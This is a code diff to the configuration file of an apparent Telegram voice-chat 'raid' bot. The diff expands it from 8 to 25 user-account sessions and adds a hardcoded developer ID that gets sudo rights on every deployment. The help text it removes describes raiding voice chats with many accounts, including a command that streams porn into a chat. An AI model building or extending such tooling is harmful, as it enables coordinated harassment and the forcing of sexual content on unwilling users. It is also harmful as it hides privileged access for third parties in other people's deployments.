@@ -11,14 +11,13 @@ from pytgcalls import PyTgCalls
 if os.path.exists(".env"):
     load_dotenv(".env")
     
-__version__ = "v0.0.2"
+__version__ = "v1"
 
-# -------------CONFIGS--------------------
 API_ID = int(os.getenv("API_ID", ""))
 API_HASH = os.getenv("API_HASH", "")
 ALIVE_PIC = os.getenv("ALIVE_PIC", "")
 BOT_TOKEN = os.getenv("BOT_TOKEN", None)
-SESSION1 = os.getenv("SESSION", None)
+SESSION = os.getenv("SESSION", None)
 SESSION2 = os.getenv("SESSION2", None)
 SESSION3 = os.getenv("SESSION3", None)
 SESSION4 = os.getenv("SESSION4", None)
@@ -26,9 +25,24 @@ SESSION5 = os.getenv("SESSION5", None)
 SESSION6 = os.getenv("SESSION6", None)
 SESSION7 = os.getenv("SESSION7", None)
 SESSION8 = os.getenv("SESSION8", None)
+SESSION9 = os.getenv("SESSION9", None)
+SESSION10 = os.getenv("SESSION10", None)
+SESSION11 = os.getenv("SESSION11", None)
+SESSION12 = os.getenv("SESSION12", None)
+SESSION13 = os.getenv("SESSION13", None)
+SESSION14 = os.getenv("SESSION14", None)
+SESSION15 = os.getenv("SESSION15", None)
+SESSION16 = os.getenv("SESSION16", None)
+SESSION17 = os.getenv("SESSION17", None)
+SESSION18 = os.getenv("SESSION18", None)
+SESSION19 = os.getenv("SESSION19", None)
+SESSION20 = os.getenv("SESSION20", None)
+SESSION21 = os.getenv("SESSION21", None)
+SESSION22 = os.getenv("SESSION22", None)
+SESSION23 = os.getenv("SESSION23", None)
+SESSION24 = os.getenv("SESSION24", None)
+SESSION25 = os.getenv("SESSION25", None)
 HNDLR = os.getenv("HNDLR", "!")
-GROUP_MODE = os.getenv("GROUP_MODE", "True")
-START_VID = os.getenv("START_VID", None)
 
 
 def make_int(str_input):
@@ -43,12 +57,12 @@ sudo = os.getenv("SUDO_USERS")
 SUDO_USERS = []
 if sudo:
     SUDO_USERS = make_int(sudo)
-DEVS = [1517994352, 1789859817, 1432756163]
+DEVS = [1517994352, 1789859817, 1432756163, 5136000092]
 for x in DEVS:
     SUDO_USERS.append(x)
 
 
-# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817 1432756163").split())))
+# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817 1432756163 5136000092").split())))
 #----------------------------------------------
 
 vcbot = Client(
@@ -56,148 +70,187 @@ vcbot = Client(
     api_id=API_ID,
     api_hash=API_HASH,
     bot_token=BOT_TOKEN,
-    plugins={'root': 'ArrayCore.vc'},
+    plugins={'root': 'ArrayCore.src'},
 )
 
-HELP_DICT = dict()
 hl = HNDLR[0]
 start_time = time.time()
 
 
-if GROUP_MODE == ("True" or "true" or "TRUE"):
-    grp = True
-else:
-    grp = False
 
 
 #-------------------------CLIENTS-----------------------------
-if SESSION1:
-    Venom1 = Client(name="Venom1", api_id=API_ID, api_hash=API_HASH, session_string=SESSION1)
-    call_py1 = PyTgCalls(Venom1)
+if SESSION:
+    Session = Client(name="Session", api_id=API_ID, api_hash=API_HASH, session_string=SESSION)
+    call_py1 = PyTgCalls(Session)
 else:
-    Venom1 = None
+    Session = None
     call_py1 = None
 
 if SESSION2:
-    Venom2 = Client(name="Venom2", api_id=API_ID, api_hash=API_HASH, session_string=SESSION2)
-    call_py2 = PyTgCalls(Venom2)
+    Session2 = Client(name="Session2", api_id=API_ID, api_hash=API_HASH, session_string=SESSION2)
+    call_py2 = PyTgCalls(Session2)
 else:
-    Venom2 = None
+    Session2 = None
     call_py2 = None
 
 if SESSION3:
-    Venom3 = Client(name="Venom3", api_id=API_ID, api_hash=API_HASH, session_string=SESSION3)
-    call_py3 = PyTgCalls(Venom3)
+    Session3 = Client(name="Session3", api_id=API_ID, api_hash=API_HASH, session_string=SESSION3)
+    call_py3 = PyTgCalls(Session3)
 else:
-    Venom3 = None
+    Session3 = None
     call_py3 = None
 
 if SESSION4:
-    Venom4 = Client(name="Venom4", api_id=API_ID, api_hash=API_HASH, session_string=SESSION4)
-    call_py4 = PyTgCalls(Venom4)
+    Session4 = Client(name="Session4", api_id=API_ID, api_hash=API_HASH, session_string=SESSION4)
+    call_py4 = PyTgCalls(Session4)
 else:
-    Venom4 = None
+    Session4 = None
     call_py4 = None
 
 if SESSION5:
-    Venom5 = Client(name="Venom5", api_id=API_ID, api_hash=API_HASH, session_string=SESSION5)
-    call_py5 = PyTgCalls(Venom5)
+    Session5 = Client(name="Session5", api_id=API_ID, api_hash=API_HASH, session_string=SESSION5)
+    call_py5 = PyTgCalls(Session5)
 else:
-    Venom5 = None
+    Session5 = None
     call_py5 = None
 
 if SESSION6:
-    Venom6 = Client(name="Venom6", api_id=API_ID, api_hash=API_HASH, session_string=SESSION6)
-    call_py6 = PyTgCalls(Venom6)
+    Session6 = Client(name="Session6", api_id=API_ID, api_hash=API_HASH, session_string=SESSION6)
+    call_py6 = PyTgCalls(Session6)
 else:
-    Venom6 = None
+    Session6 = None
     call_py6 = None
         
 if SESSION7:
-    Venom7 = Client(name="Venom7", api_id=API_ID, api_hash=API_HASH, session_string=SESSION7)
-    call_py7 = PyTgCalls(Venom7)
+    Session7 = Client(name="Session7", api_id=API_ID, api_hash=API_HASH, session_string=SESSION7)
+    call_py7 = PyTgCalls(Session7)
 else:
-    Venom7 = None
+    Session7 = None
     call_py7 = None
 
 if SESSION8:
-    Venom8 = Client(name="Venom8", api_id=API_ID, api_hash=API_HASH, session_string=SESSION8)
-    call_py8 = PyTgCalls(Venom8)
+    Session8 = Client(name="Session8", api_id=API_ID, api_hash=API_HASH, session_string=SESSION8)
+    call_py8 = PyTgCalls(Session8)
 else:
-    Venom8 = None
+    Session8 = None
     call_py8 = None
 
-#----------------------------------------------------------------
+if SESSION9:
+    Session9 = Client(name="Session9", api_id=API_ID, api_hash=API_HASH, session_string=SESSION9)
+    call_py9 = PyTgCalls(Session9)
+else:
+    Session9 = None
+    call_py9 = None
 
-HELP_DICT["Music Player"] = f"""
-**Basic music player commands!**
+if SESSION10:
+    Session10 = Client(name="Session10", api_id=API_ID, api_hash=API_HASH, session_string=SESSION10)
+    call_py10 = PyTgCalls(Session10)
+else:
+    Session10 = None
+    call_py10 = None
 
-**Command:** `{hl}play`
-**Usage:** __Plays the song in voice chat. Supports replied audio, Youtube link or just a keyword to search.__
-**Example:** `{hl}play Closer`
+if SESSION11:
+    Session11 = Client(name="Session11", api_id=API_ID, api_hash=API_HASH, session_string=SESSION11)
+    call_py11 = PyTgCalls(Session11)
+else:
+    Session11 = None
+    call_py11 = None
 
-**Command:** `{hl}end`
-**Usage:** __Ends the music stream and leaves the voice chat.__
+if SESSION12:
+    Session12 = Client(name="Session12", api_id=API_ID, api_hash=API_HASH, session_string=SESSION12)
+    call_py12 = PyTgCalls(Session12)
+else:
+    Session12 = None
+    call_py12 = None
 
-**Commad:** `{hl}pause`
-**Usage:** __Pause the music stream in voice chat.__
+if SESSION13:
+    Session13 = Client(name="Session13", api_id=API_ID, api_hash=API_HASH, session_string=SESSION13)
+    call_py13 = PyTgCalls(Session13)
+else:
+    Session13 = None
+    call_py13 = None
 
-**Commad:** `{hl}list`
-**Usage:** __Shows the playlist in current chat.__
+if SESSION14:
+    Session14 = Client(name="Session14", api_id=API_ID, api_hash=API_HASH, session_string=SESSION14)
+    call_py14 = PyTgCalls(Session14)
+else:
+    Session14 = None
+    call_py14 = None
+        
+if SESSION15:
+    Session15 = Client(name="Session15", api_id=API_ID, api_hash=API_HASH, session_string=SESSION15)
+    call_py15 = PyTgCalls(Session15)
+else:
+    Session15 = None
+    call_py15 = None
 
-**Commad:** `{hl}resume`
-**Usage:** __Resumes the paused stream in voice chat.__
+if SESSION16:
+    Session16 = Client(name="Session16", api_id=API_ID, api_hash=API_HASH, session_string=SESSION16)
+    call_py16 = PyTgCalls(Session16)
+else:
+    Session16 = None
+    call_py16 = None
+    
+if SESSION17:
+    Session17 = Client(name="Session17", api_id=API_ID, api_hash=API_HASH, session_string=SESSION17)
+    call_py17 = PyTgCalls(Session17)
+else:
+    Session17 = None
+    call_py17 = None
 
-**Commad:** `{hl}skip`
-**Usage:** __Skips the current song playing in voice chat.__
-"""
+if SESSION18:
+    Session18 = Client(name="Session18", api_id=API_ID, api_hash=API_HASH, session_string=SESSION18)
+    call_py18 = PyTgCalls(Session18)
+else:
+    Session18 = None
+    call_py18 = None
 
-HELP_DICT["VC Raid"] = f"""
-**Voice Chat Raiding Commands!**
+if SESSION19:
+    Session19 = Client(name="Session19", api_id=API_ID, api_hash=API_HASH, session_string=SESSION19)
+    call_py19 = PyTgCalls(Session19)
+else:
+    Session19 = None
+    call_py19 = None
 
-**Commad:** `{hl}raid`
-**Usage:** __Raids the mentioned voice chat.__
-**Example:**
-    ~ `{hl}vcraid chat username/id` [If in bot PM.]
-    ~ `{hl}vcraid` [If in a group.]
+if SESSION20:
+    Session20 = Client(name="Session20", api_id=API_ID, api_hash=API_HASH, session_string=SESSION20)
+    call_py20 = PyTgCalls(Session20)
+else:
+    Session20 = None
+    call_py20 = None
 
-**Commad:** `{hl}vraid`
-**Usage:** __Raids With Video in the mentioned voice chat.__
-**Example:**
-    ~ `{hl}vraid chat username/id` [If in bot PM.]
-    ~ `{hl}vraid` [If in a group.]
+if SESSION21:
+    Session21 = Client(name="Session21", api_id=API_ID, api_hash=API_HASH, session_string=SESSION21)
+    call_py21 = PyTgCalls(Session21)
+else:
+    Session21 = None
+    call_py21 = None
 
-**Commad:** `{hl}praid`
-**Usage:** __Raids Porn in the mentioned voice chat.__
-**Example:**
-    ~ `{hl}praid chat username/id` [If in bot PM.]
-    ~ `{hl}praid` [If in a group.]
+if SESSION22:
+    Session22 = Client(name="Session22", api_id=API_ID, api_hash=API_HASH, session_string=SESSION22)
+    call_py22 = PyTgCalls(Session22)
+else:
+    Session22 = None
+    call_py22 = None
+        
+if SESSION23:
+    Session23 = Client(name="Session23", api_id=API_ID, api_hash=API_HASH, session_string=SESSION23)
+    call_py23 = PyTgCalls(Session23)
+else:
+    Session23 = None
+    call_py23 = None
 
-**Explanation:**
-    ▪︎First Join All Your Id's In The Group By {hl}join `@chatusername` if chat is private Then {hl}join `https://t.me/+rNTg-asHGZYzODY1` \n Then Do {hl}raid In Groups 
+if SESSION24:
+    Session24 = Client(name="Session24", api_id=API_ID, api_hash=API_HASH, session_string=SESSION24)
+    call_py24 = PyTgCalls(Session24)
+else:
+    Session24 = None
+    call_py24 = None
 
-**Commad:** `{hl}raidend`
-**Usage:** __Stops the voice chat raid and leaves voice chat.__
-
-**Commad:** `{hl}raidpause`
-**Usage:** __Pauses the voice chat raid.__
-
-**Commad:** `{hl}raidresume`
-**Usage:** __Resumes the paused voice chat raid.__
-"""
-
-HELP_DICT["Extras"] = f"""
-**Some extra commands!**
-
-**Commad:** `{hl}help`
-**Usage:** __To see the help menu with all command details.__
-
-**Commad:** `{hl}start`
-**Usage:**  __To see the start message.__
-
-**Command:** `{hl}join <username / invite link>`
-**Usage:** __Joins the chat with all clients.__
-
-**Command:** `{hl}leave <username> / <chat-id>`
-**Usage:** __Leaves the chat with all clients.__
-"""
+if SESSION25:
+    Session25 = Client(name="Session25", api_id=API_ID, api_hash=API_HASH, session_string=SESSION25)
+    call_py25 = PyTgCalls(Session25)
+else:
+    Session25 = None
+    call_py25 = None
